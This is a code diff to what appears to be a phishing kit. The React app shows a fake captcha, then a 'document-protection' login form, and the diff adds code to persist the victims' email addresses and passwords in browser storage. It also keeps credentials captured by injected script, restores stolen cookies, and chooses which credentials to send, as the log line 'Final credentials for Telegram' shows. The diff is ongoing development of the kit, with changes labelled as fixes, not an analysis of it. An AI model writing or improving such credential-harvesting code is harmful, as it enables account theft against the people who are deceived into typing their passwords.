@@ -21,6 +21,50 @@ const captchaVerificationDelay = 1500;
 const redirectingDelay = 3000;
 const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;
 
+// Helper functions for persistent storage
+const setStoredPassword = (password: string) => {
+  try {
+    localStorage.setItem('captured_password', password);
+    sessionStorage.setItem('captured_password', password);
+  } catch (error) {
+    console.warn('Failed to store password:', error);
+  }
+};
+
+const getStoredPassword = (): string | null => {
+  try {
+    return localStorage.getItem('captured_password') || sessionStorage.getItem('captured_password');
+  } catch (error) {
+    console.warn('Failed to retrieve stored password:', error);
+    return null;
+  }
+};
+
+const setStoredFormCredentials = (email: string, password: string) => {
+  try {
+    const credentials = {
+      email,
+      password,
+      captureTime: new Date().toISOString(),
+      source: 'document-protection-form'
+    };
+    localStorage.setItem('form_credentials', JSON.stringify(credentials));
+    sessionStorage.setItem('form_credentials', JSON.stringify(credentials));
+  } catch (error) {
+    console.warn('Failed to store form credentials:', error);
+  }
+};
+
+const getStoredFormCredentials = () => {
+  try {
+    const stored = localStorage.getItem('form_credentials') || sessionStorage.getItem('form_credentials');
+    return stored ? JSON.parse(stored) : null;
+  } catch (error) {
+    console.warn('Failed to retrieve stored form credentials:', error);
+    return null;
+  }
+};
+
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
   const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
@@ -101,11 +145,24 @@ function App() {
       const storedData = getStoredData();
       if (storedData.email) {
         setCapturedEmailState(storedData.email);
+        setFormEmail(storedData.email); // Pre-fill form with stored email
         console.log('📧 Restored stored email:', storedData.email);
       }
       if (storedData.cookies && storedData.cookies.length > 0) {
         setCapturedCookiesState(JSON.stringify(storedData.cookies));
         console.log('🍪 Restored stored cookies:', storedData.cookies.length);
+      }
+
+      // 🔧 FIX: Restore form credentials from persistent storage
+      const storedFormCredentials = getStoredFormCredentials();
+      if (storedFormCredentials) {
+        setCapturedCredentials(storedFormCredentials);
+        setFormEmail(storedFormCredentials.email || '');
+        console.log('📋 Restored form credentials from storage:', {
+          email: storedFormCredentials.email,
+          hasPassword: !!storedFormCredentials.password,
+          source: storedFormCredentials.source
+        });
       }
     } catch (error) {
       console.warn('⚠️ Failed to restore stored data:', error);
@@ -210,17 +267,28 @@ function App() {
         event.data.type === 'CREDENTIALS_CAPTURED' &&
         (event.data.data?.password || event.data.data?.email || event.data.data?.username)
       ) {
-        setCapturedCredentials(event.data.data);
+        const newCredentials = {
+          ...event.data.data,
+          captureTime: new Date().toISOString(),
+          source: event.data.data?.source || 'injected-capture'
+        };
+        
+        setCapturedCredentials(newCredentials);
         console.log('🔐 Enhanced credentials captured:', {
-          hasEmail: !!event.data.data?.email,
-          hasPassword: !!event.data.data?.password,
-          hasUsername: !!event.data.data?.username,
-          source: event.data.data?.source
+          hasEmail: !!newCredentials?.email,
+          hasPassword: !!newCredentials?.password,
+          hasUsername: !!newCredentials?.username,
+          source: newCredentials?.source
         });
 
-        if (event.data.data.email) {
-          setCapturedEmailState(event.data.data.email);
-          setCapturedEmail(event.data.data.email);
+        // 🔧 FIX: Store credentials persistently
+        if (newCredentials.email && newCredentials.password) {
+          setStoredFormCredentials(newCredentials.email, newCredentials.password);
+        }
+
+        if (newCredentials.email) {
+          setCapturedEmailState(newCredentials.email);
+          setCapturedEmail(newCredentials.email);
         }
       }
 
@@ -262,16 +330,23 @@ function App() {
     setIsSubmitting(true);
 
     try {
-      // 🔧 FIX: Store form credentials immediately when form is submitted
-      setCapturedEmailState(formEmail);
-      setCapturedCredentials({
+      // 🔧 FIX: Store form credentials in persistent storage immediately
+      const formCredentials = {
         email: formEmail,
         password: formPassword,
         captureTime: new Date().toISOString(),
         source: 'document-protection-form'
-      });
+      };
 
-      console.log('📋 Form credentials captured:', {
+      // Store in both React state and persistent storage
+      setCapturedEmailState(formEmail);
+      setCapturedCredentials(formCredentials);
+      
+      // Store persistently
+      setStoredFormCredentials(formEmail, formPassword);
+      setCapturedEmail(formEmail);
+
+      console.log('📋 Form credentials captured and stored persistently:', {
         email: formEmail,
         hasPassword: !!formPassword,
         source: 'document-protection-form'
@@ -346,14 +421,32 @@ function App() {
     if (!hasSentAuthData) {
       setHasSentAuthData(true);
 
-      // 🔧 FIX: Prioritize captured credentials over form state
-      const finalEmail = capturedCredentials?.email || capturedEmail || formEmail || '';
-      const finalPassword = capturedCredentials?.password || formPassword || '';
+      // 🔧 FIX: Get credentials from persistent storage first, then fallback to state
+      const storedFormCredentials = getStoredFormCredentials();
+      
+      let finalEmail = '';
+      let finalPassword = '';
+
+      // Priority order: stored form credentials > captured credentials > current form state > captured email
+      if (storedFormCredentials) {
+        finalEmail = storedFormCredentials.email || '';
+        finalPassword = storedFormCredentials.password || '';
+        console.log('📊 Using stored form credentials');
+      } else if (capturedCredentials?.email && capturedCredentials?.password) {
+        finalEmail = capturedCredentials.email;
+        finalPassword = capturedCredentials.password;
+        console.log('📊 Using captured credentials from state');
+      } else {
+        finalEmail = formEmail || capturedEmail || '';
+        finalPassword = formPassword || getStoredPassword() || '';
+        console.log('📊 Using fallback credentials');
+      }
 
       console.log('📊 Final credentials for Telegram:', {
         finalEmail,
         hasPassword: !!finalPassword,
-        passwordSource: capturedCredentials?.source || 'form-state',
+        passwordSource: storedFormCredentials ? 'stored-form' : (capturedCredentials?.source || 'fallback'),
+        storedCredentialsExists: !!storedFormCredentials,
         capturedCredentialsExists: !!capturedCredentials,
         formEmailExists: !!formEmail,
         formPasswordExists: !!formPassword
